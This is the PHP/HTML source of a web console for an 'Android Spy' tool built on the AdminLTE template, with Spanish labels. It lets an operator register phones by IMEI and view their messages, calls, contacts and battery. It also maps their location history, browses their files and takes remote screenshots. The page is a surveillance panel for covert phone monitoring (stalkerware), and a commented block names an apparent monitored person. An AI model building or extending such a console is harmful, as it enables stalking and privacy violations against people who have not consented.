<?php
include"header.php";
if(get_session('user')==""){
  ?>
  <script>
  
    location.href =window.location.origin;
  </script>
  <?php
}
?>
<!DOCTYPE html>
<html>

<head>
  <style type="text/css">
  .Tarjeta{
    border-bottom:solid #ccc 1px;
    border-radius: 3px 3px 3px 3px;
    width: 100%;
    margin-bottom: 10px;
  }
  .Tfoto{
    border:solid #000 0px;
    width: 100%;
    height: 50px;
  }
  .Tnombre{
    border:solid #000 0px;
    width: 100%;
    height: 15px;
    size: 15px;

  }
  .Tdescrip{
    border:solid #000 0px;
    width: 100%;
    height: 15px;
  }
  .Tbateria{
    border:solid #000 0px;
    width: 100%;
    height: 15px;
  }
  .mini_screen{
    display: inline-block;
    width: 15%;
    border: solid #000 0px;
    word-wrap: break-word;
  }
  .mini_explo{
    display: inline-block;
    width: 15%;
    border: solid #000 0px;
    word-wrap: break-word;
  }
  .text_mini{
    size: 5em;
  }
  .controles{
    display: inline-block;
    
    height: 400px;
    overflow-y: scroll;
  }
</style>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.3.4/dist/leaflet.css" accesskey="" integrity="sha512-puBpdR0798OZvTTbP4A8Ix/l+A4dHDD0DGqYW6RQ+9jxkRFclaxxQb/SJAWZfWAkuyeQUytO7+7N4QKrDh+drA==" crossorigin="">
  <script src="https://unpkg.com/leaflet@1.3.4/dist/leaflet.js" integrity="sha512-nMMmRyTVoLYqjP9hrbed9S+FzjZHW5gY1TWCHA5ckwXZBadntCNs8kEqAWdrb9O7rxbCaA4lKTIWjDXZxflOcA==" crossorigin=""></script>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Android Spy | Consola</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  <!-- AdminLTE Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
  <!-- Morris chart -->
  <!--<link rel="stylesheet" href="bower_components/morris.js/morris.css">-->
  <!-- jvectormap -->
  <link rel="stylesheet" href="bower_components/jvectormap/jquery-jvectormap.css">
  <!-- Date Picker -->
  <link rel="stylesheet" href="bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css">
  <!-- Daterange picker -->
  <link rel="stylesheet" href="bower_components/bootstrap-daterangepicker/daterangepicker.css">
  <!-- bootstrap wysihtml5 - text editor -->
  <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">

  <link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
  <link rel="stylesheet" href="/resources/demos/style.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->

  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
</head>
<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <!-- Logo -->
    <a href="index2.html" class="logo">
      <!-- mini logo for sidebar mini 50x50 pixels -->
      <span class="logo-mini"><b>A</b>LT</span>
      <!-- logo for regular state and mobile devices -->
      <span class="logo-lg"><b>Android</b>Spy</span>
    </a>
    <!-- Header Navbar: style can be found in header.less -->
    <nav class="navbar navbar-static-top">
      <!-- Sidebar toggle button-->
      <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
        <span class="sr-only">Toggle navigation</span>
      </a>

      <div class="navbar-custom-menu">
        <ul class="nav navbar-nav">
          
          <li class="dropdown user user-menu">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <img src="https://payload.cargocollective.com/1/3/122148/1670411/13.jpg" class="user-image" alt="User Image">
              <span class="hidden-xs"><?php echo get_session('user');?></span>
            </a>
            <ul class="dropdown-menu">
              <!-- User image -->
              <li class="user-header">
                <img src="https://payload.cargocollective.com/1/3/122148/1670411/13.jpg" class="img-circle" alt="User Image">

                <p>
                  <?php echo get_session('user');?> 
                  <small>Member since Nov. 2012</small>
                </p>
              </li>
              <!-- Menu Body -->
              <li class="user-body">
                <div class="row">
                  <div class="col-xs-4 text-center">
                    <div id="T_contactos"></div>
                    <a href="#">Contactos</a>
                  </div>
                  <div class="col-xs-4 text-center">
                    <div id="T_"></div>
                    <a href="#">Sales</a>
                  </div>
                  <div class="col-xs-4 text-center">
                    <div id="T_"></div>
                    <a href="#">Friends</a>
                  </div>
                </div>
                <!-- /.row -->
              </li>
              <!-- Menu Footer-->
              <li class="user-footer">
                <!--<div class="pull-left">
                  <a href="#" class="btn btn-default btn-flat">Profile</a>
                </div>-->
                <div class="pull-right">
                  <a href="salir.php" class="btn btn-default btn-flat">Salir</a>
                </div>
              </li>
            </ul>
          </li>
          <!-- Control Sidebar Toggle Button -->
          <li>
            <a href="#" data-toggle="control-sidebar"><i class="fa fa-gears"></i></a>
          </li>
        </ul>
      </div>
    </nav>
  </header>
  <!-- Left side column. contains the logo and sidebar -->
  <?php
  include("sidebar.php");
  ?>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Panel de Control
        <!--<small>Panel de Control</small>-->
      </h1>
      <ol class="breadcrumb">
        <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">Dashboard</li>
      </ol>
    </section>

    <!-- Main content data-toggle="modal" data-target="#myModal" -->
    <section class="content">
      <!-- Small boxes (Stat box) -->
      <div class="row">
        <div class="col-lg-3 col-xs-6">

          <div class="small-box bg-aqua">
            <div class="inner">
              <h3 id="Nmsn">---</h3>

              <p>Mensajes</p>
            </div>
            <div class="icon">
              <i class="fa fa-envelope-o"></i>
            </div>
            <!--<a href="#" class="small-box-footer">Ver  <i class="fa fa-arrow-circle-right"></i></a>-->
          </div>
        </div>

        <div class="col-lg-3 col-xs-6">

          <div class="small-box bg-green">
            <div class="inner">
              <h3 id="nllamadas">---</h3>

              <p>Llamadas</p>
            </div>
            <div class="icon">
              <i class="fa fa-phone"></i>
            </div>
            <!--<a data-toggle="modal" data-target="#Alta" class="btn btn-social-icon btn-primary pull-right"><i class="fa fa-mobile-phone">  </i><i class="fa fa-plus"></i>
              </a>-->
              <a  data-toggle="modal" data-target="#Mllamadas" class="small-box-footer">Ver  <i class="fa fa-arrow-circle-right"></i></a>
          </div>
        </div>

        <div class="col-lg-3 col-xs-6">

          <div class="small-box bg-red">
            <div class="inner">
              <h3 id="ncontactos">---</h3>

              <p>Contactos</p>
            </div>
            <div class="icon">
              <i class="fa fa-user"></i>
            </div>
            <!--<a href="#" class="small-box-footer">Ver  <i class="fa fa-arrow-circle-right"></i></a>-->
          </div>
        </div>

         <div class="col-lg-3 col-xs-6">

          <div class="small-box bg-yellow">
            <div class="inner">
              <h3 id="bateria">---</h3>

              <p>Bateria</p>
            </div>
            <div class="icon">
              <i class="fa  fa-battery-3"></i>
            </div>
            <!--<a href="#" class="small-box-footer">Ver <i class="fa fa-arrow-circle-right"></i></a>-->
          </div>
        </div>

      </div>
      <!-- /.row -->
      
      <!-- Main row -->
      <div class="row">

        <!--Tarjetas-->
      <section class="col-lg-4 connectedSortable">
      
         <?php
        //include("widget/select_imei.php");
        ?>
        <input id="select_imei" type="hidden" class="form-control" name="">
          <!-- Widget: user widget style 1 -->
          <div class="box box-widget widget-user">
            <!-- Add the bg color to the header using any of the bg-* classes -->
            <div class="widget-user-header bg-aqua-active">
              <h3 id="T_nombre" class="widget-user-username"></h3>
              <h5 id="T_descrip" class="widget-user-desc"></h5>
            </div>
            <div class="widget-user-image">
              <img class="img-circle" src="https://payload.cargocollective.com/1/3/122148/1670411/13.jpg" alt="User Avatar">
            </div>
            <div class="box-footer">
              <div class="row">
                <div class="col-sm-4 border-right">
                  <div class="description-block">
                    <h5 id="T_archivos" class="description-header">---</h5>
                    <span class="description-text">Arcivos</span>
                  </div>
                  <!-- /.description-block -->
                </div>
                <!-- /.col -->
                <div class="col-sm-4 border-right">
                  <div class="description-block">
                    <h5 id="T_screen" class="description-header">---</h5>
                    <span class="description-text">Capturas</span>
                  </div>
                  <!-- /.description-block -->
                </div>
                <!-- /.col -->
                <div class="col-sm-4">
                  <div class="description-block">
                    <h5 id="ult_conexion" class="description-header">---</h5>
                    <span class="description-text">Ult.Conexion</span>
                  </div>
                  <!-- /.description-block -->
                </div>
                <!-- /.col -->
              </div>
              <!-- /.row -->
            </div>
          </div>
          <!-- /.widget-user -->
        
      <!--Tarjetas-->

      <!--Dispositivos-->
      <div class="box box-primary" style="position: relative; left: 0px; top: 0px;">
            <div class="box-header ui-sortable-handle" style="cursor: move;">
              <i class="ion ion-clipboard"></i>

              <h3 class="box-title">Mis Dispositivos</h3>

              <div class="box-tools pull-right">
                <a data-toggle="modal" data-target="#Alta" class="btn btn-social-icon btn-primary pull-right"><i class="fa fa-mobile-phone">  </i><i class="fa fa-plus"></i>
              </a>
                
              </div>
            </div>
            <!-- /.box-header -->
            <div class="box-body">
              <div  id="dispositivos" style="width: 100%; height: 400px; overflow-y: scroll;"></div>
              <!-- See dist/js/pages/dashboard.js to activate the todoList plugin -->
              
            </div>
            <!-- /.box-body -->
            <div class="box-footer clearfix no-border">
              <!--<button data-toggle="modal" data-target="#Alta" class="btn btn-default pull-right"><i class="fa fa-plus"></i> Add item</button>-->

            </div>
          </div>
      </section>

      <section class="col-lg-8 connectedSortable">
      <!--mapa localizacion-->

          <!--Mapa-->
          <div class="box box-solid bg-light-blue-gradient">
            <div class="box-header">
              <!-- tools box -->
              <div class="pull-right box-tools">
                <button type="button" class="btn btn-primary btn-sm daterange pull-right" data-toggle="tooltip"
                        title="Date range">
                  <i class="fa fa-calendar"></i></button>
                <button type="button" class="btn btn-primary btn-sm pull-right" data-widget="collapse"
                        data-toggle="tooltip" title="Collapse" style="margin-right: 5px;">
                  <i class="fa fa-minus"></i></button>
              </div>
              <!-- /. tools -->

              <i class="fa fa-map-marker"></i>

              <h3 class="box-title">
                Ubicaci&oacute;n
              </h3>
            </div>
            <div id="content_mapa" class="box-body">

             <div id="mapa" style="height: 675px; width: 100%; position: relative; outline: none; z-index:1;" class=" " tabindex="0"></div>
            </div>
            <!-- /.box-body-->
            <div class="box-footer no-border">
              <div class="row">
                <div class=" text-center">
                  <div class="col-xs-4 text-center">
                    <button class="btn btn-primary" onclick="O_Localizar();">Localizar</button>
                  </div>
                </div>

                 <div class=" text-center">
                  <div class="col-xs-4 text-center">
                    <button class="btn btn-primary" onclick="O_Historial();">Historial</button>
                  </div>
                </div>

                 <div class=" text-center">
                  <div class="col-xs-4 text-center">
                    <button class="btn btn-primary" onclick="O_Trazar();">Trazar</button>
                  </div>
                </div>

               
              </div>
              <!-- /.row -->
            </div>
          </div>
          
        </section>
      <!--mapa localizacion-->
        <!-- Left col -->
        <section class="col-lg-4 connectedSortable">
       

          <!-- Custom tabs (Charts with tabs)-->
          <div class="nav-tabs-custom">
            <!-- Tabs within a box -->
            <ul class="nav nav-tabs pull-right">
              
              <li class="pull-left header"><img id="load2" src="../images/loader.gif" width="20px"><i id="load1" class="fa fa-inbox"></i> Explorador</li>
            </ul>
            <div class="tab-content no-padding">
              <div class="controles" name="explorador" id="explorador_archivos" style="width: 100%; height: 500px; overflow-y: scroll; padding: 10px 10px 10px 10px;"></div>
              <!-- Morris chart - Sales 
              <div class="chart tab-pane active" id="revenue-chart" style="position: relative; height: 300px;"></div>
              <div class="chart tab-pane" id="sales-chart" style="position: relative; height: 300px;"></div>-->
            </div>
          </div>
          <!-- /.nav-tabs-custom -->
          </section>

          <section class="col-lg-8 connectedSortable">
          <!-- Chat box -->
          <div class="box box-success">
            <div class="box-header">
              <i class="fa fa-comments-o"></i>

              <h3 class="box-title">Descargas</h3>

              <div class="box-tools pull-right" data-toggle="tooltip" title="Status">
                <div class="btn-group" data-toggle="btn-toggle">
                  <!--<button type="button" class="btn btn-default btn-sm active"><i class="fa fa-square text-green"></i>
                  </button>
                  <button type="button" class="btn btn-default btn-sm"><i class="fa fa-square text-red"></i></button>-->
                </div>
              </div>
            </div>
            <div class="box-body chat" id="chat-box">
              <div class="controles" name="descargas" id="descargas" style="width: 100%; height: 500px; overflow-y: scroll; padding: 10px 10px 10px 10px;"></div>
            </div>
            
          </div>
          </section>
          <!-- /.box (chat box) -->
          <section class="col-lg-4 connectedSortable ui-sortable">
          <div class="box box-solid bg-light-blue-gradient" >
            <div class="box-header">
              <!-- tools box -->
              <div class="pull-right box-tools">
                <button type="button" class="btn btn-primary btn-sm daterange pull-right" data-toggle="tooltip"
                        title="Date range">
                  <i class="fa fa-calendar"></i></button>
                <button type="button" class="btn btn-primary btn-sm pull-right" data-widget="collapse"
                        data-toggle="tooltip" title="Collapse" style="margin-right: 5px;">
                  <i class="fa fa-minus"></i></button>
              </div>
              <!-- /. tools -->

              <i class="fa fa-map-marker"></i>

              <h3 class="box-title">
                Visor
              </h3>
            </div>
            <div id="content_screen" class="box-body"  style="height: 550px;">

             
            </div>
            <!-- /.box-body-->
            <div class="box-footer no-border">
              <div class="row">
                <div class=" text-center">
                  <div class="col-xs-12 text-center">
                    <button class="btn btn-primary" onclick="O_Screen();">ScreenShot</button>
                  </div>
                </div>
              </div>
              <!-- /.row -->
            </div>
          </div>
          </section>
          <section class="col-lg-8 connectedSortable">
          <!-- TO DO List -->
          <div class="box box-primary">
            <div class="box-header">
              <i class="ion ion-clipboard"></i>

              <h3 class="box-title">ScreenShot</h3>

              <div class="box-tools pull-right">
                <!--<ul class="pagination pagination-sm inline">
                  <li><a href="#">&laquo;</a></li>
                  <li><a href="#">1</a></li>
                  <li><a href="#">2</a></li>
                  <li><a href="#">3</a></li>
                  <li><a href="#">&raquo;</a></li>
                </ul>-->
              </div>
            </div>
            <!-- /.box-header -->
            <div class="box-body" >
              <div class="controles" name="Screenshots" id="Screen_explorer" style="width: 100%; height: 575px;">
                
              </div>
                  
            </div>
            
            <!-- /.box-body -->
           
          </div>
          <!-- /.box -->

         

        </section>
        <!-- /.Left col -->
        <!-- right col (We are only adding the ID to make the widgets sortable)-->
        
        <!-- right col -->
      </div>
      <!-- /.row (main row) -->

    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
  <!--<footer class="main-footer">
    <div class="pull-right hidden-xs">
      <b>Version</b> 2.4.0
    </div>
    <strong>Copyright &copy; 2014-2016 <a href="https://adminlte.io">Almsaeed Studio</a>.</strong> All rights
    reserved.
  </footer>-->

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
      <li><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-gears"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Recent Activity</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-birthday-cake bg-red"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Langdon's Birthday</h4>

                <p>Will be 23 on April 24th</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-yellow"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Frodo Updated His Profile</h4>

                <p>New phone +1(800)555-1234</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Nora Joined Mailing List</h4>

                <p>nora@example.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-file-code-o bg-green"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Cron Job 254 Executed</h4>

                <p>Execution time 5 seconds</p>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

        <h3 class="control-sidebar-heading">Tasks Progress</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Custom Template Design
                <span class="label label-danger pull-right">70%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-danger" style="width: 70%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Update Resume
                <span class="label label-success pull-right">95%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-success" style="width: 95%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Laravel Integration
                <span class="label label-warning pull-right">50%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-warning" style="width: 50%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Back End Framework
                <span class="label label-primary pull-right">68%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-primary" style="width: 68%"></div>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

      </div>
      <!-- /.tab-pane -->
      <!-- Stats tab content -->
      <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
        <form method="post">
          <h3 class="control-sidebar-heading">General Settings</h3>

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Report panel usage
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Some information about this general settings option
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Allow mail redirect
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Other sets of options are available
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Expose author name in posts
              <input type="checkbox" class="pull-right" checked>
            </label>

            <p>
              Allow the user to show his name in blog posts
            </p>
          </div>
          <!-- /.form-group -->

          <h3 class="control-sidebar-heading">Chat Settings</h3>

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Show me as online
              <input type="checkbox" class="pull-right" checked>
            </label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Turn off notifications
              <input type="checkbox" class="pull-right">
            </label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">
              Delete chat history
              <a href="javascript:void(0)" class="text-red pull-right"><i class="fa fa-trash-o"></i></a>
            </label>
          </div>
          <!-- /.form-group -->
        </form>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  <!-- Add the sidebar's background. This div must be placed
       immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
</div>
<!-- ./wrapper -->

<!-- jQuery 3 -->
<script src="bower_components/jquery/dist/jquery.min.js"></script>
<!-- jQuery UI 1.11.4 -->
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
<!-- Resolve conflict in jQuery UI tooltip with Bootstrap tooltip -->
<script>
  $.widget.bridge('uibutton', $.ui.button);
</script>
<!-- Bootstrap 3.3.7 -->
<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
<!-- Morris.js charts -->
<script src="bower_components/raphael/raphael.min.js"></script>
<!--<script src="bower_components/morris.js/morris.min.js"></script>-->
<!-- Sparkline -->
<script src="bower_components/jquery-sparkline/dist/jquery.sparkline.min.js"></script>
<!-- jvectormap -->
<script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
<script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
<!-- jQuery Knob Chart -->
<script src="bower_components/jquery-knob/dist/jquery.knob.min.js"></script>
<!-- daterangepicker -->
<script src="bower_components/moment/min/moment.min.js"></script>
<script src="bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
<!-- datepicker -->
<script src="bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js"></script>
<!-- Bootstrap WYSIHTML5 -->
<script src="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
<!-- Slimscroll -->
<script src="bower_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
<!-- FastClick -->
<script src="bower_components/fastclick/lib/fastclick.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
<!-- AdminLTE dashboard demo (This is only for demo purposes) -->
<!--<script src="dist/js/pages/dashboard.js"></script>-->
<!-- AdminLTE for demo purposes -->
<script src="dist/js/demo.js"></script>
<script src="dist/js/demo.js"></script>

<script src="../js/funciones.js">

</script>
<!-- Button trigger modal -->


<!-- Modal -->
<div class="modal fade bs-example-modal-lg" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content" >
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Visor</h4>
      </div>
      <div class="modal-body">
        <center>
          <div id="visor"></div>
        </center>
       
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        
      </div>
    </div>
  </div>
</div>

<!-- Modal -->
<div class="modal fade bs-example-modal-lg" id="Alta" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content" >
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Registrar imei</h4>
      </div>
      <div class="modal-body">
        <center>
          <div class="box box-info">
            
            <!-- /.box-header -->
            <!-- form start -->
            <form id="form_imei" class="form-horizontal">
              <div class="box-body">
                <div class="form-group">
                  <label for="inputEmail3" class="col-sm-2 control-label">Nombre</label>

                  <div class="col-sm-10">
                    <input type="text" class="form-control" id="r_nombre" placeholder="Nombre">
                  </div>
                </div>
                <div class="form-group">
                  <label for="inputPassword3" class="col-sm-2 control-label">Imei</label>

                  <div class="col-sm-10">
                    <input type="text" class="form-control" id="r_imei" placeholder="Imei">
                  </div>
                </div> 
                <div class="form-group">
                  <label for="inputPassword3" class="col-sm-2 control-label">No. Telefono</label>

                  <div class="col-sm-10">
                    <input type="text" class="form-control" id="r_numero" placeholder="Numero">
                  </div>
                </div> 
                <div class="form-group">
                    <label for="inputPassword3" class="col-sm-2 control-label">Descripci&oacute;n</label>

                    <div class="col-sm-10">
                      <textarea class="form-control" rows="3" id="r_descrip" placeholder="Enter ..."></textarea>
                    </div>
                </div>               
              </div>
              <!-- /.box-body -->
              
              <!-- /.box-footer -->
            </form>
          </div>
        </center>
       
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
        <button id=registrar_imei class="btn btn-info pull-right">Registrar</button>
        
      </div>
    </div>
  </div>
</div>



<!-- Modal -->
<div class="modal fade bs-example-modal-lg" id="Mllamadas" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content" >
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">LLamadas</h4>
      </div>
      <div class="modal-body">
        <table class="table table-striped" id="Tllamadas">
          
        </table>
       
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        
      </div>
    </div>
  </div>
</div>



</body>
</html>




<!--
  <td><style type="text/css">
  .tamanio{
    font-size: 12px;
  }
</style>
<div style=" border: 1px #ddd solid; width: 100%; font-size: 0.8em;  color: #555; background-color: #fff;">
 <table width="100%" border="0">
  <tbody><tr>
    <td>
      <img src="../imagen/usuario.png" width="40" height="40">
    </td>
    <td colspan="3">
      <font class="tamanio">PABLO CRUZ CLAUDIA (SI)/1</font>
      <br>
      <span class="tamanio">SmartPhone<br>
      2019-04-12 00:00:00</span>
      
    </td>
  </tr>
  <tr>
    
    <td style="text-align: center;" class="tamanio" colspan="3">
      <div class="progress progress-xs progress-striped active">
        <div class="progress-bar progress-bar-" style="width: 0%"></div>
      </div>
    </td>

    <td style="text-align: center;" class="tamanio">
      <span class="badge bg-">0%</span>
    </td>
     
   </tr>


  <tr>
    <td>
      <center><a href="#" onclick="mapa_ruta('1')"><img src="../tarjeta/traruta.png" width="20"></a></center>
    </td>
    <td>
      <center><a><img src="../app/imagen/gpsdesactivo.png" width="20"></a></center>
    </td>
    
    <td>
      <center><img src="../tarjeta/25.png" width="30">0%</center>
    </td>
    <td>
      <center><a href="" id="myBtn0" data-toggle="modal" data-target=".bs-example-modal-lg"><img src="../imagen/reportes.png" width="20"></a></center>
    </td>
  </tr>
 </tbody></table>
</div>


<div class="modal fade" role="dialog" id="myModal0">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content" id="reportes0">
      ...0    </div>
  </div>
</div>

  </td>-->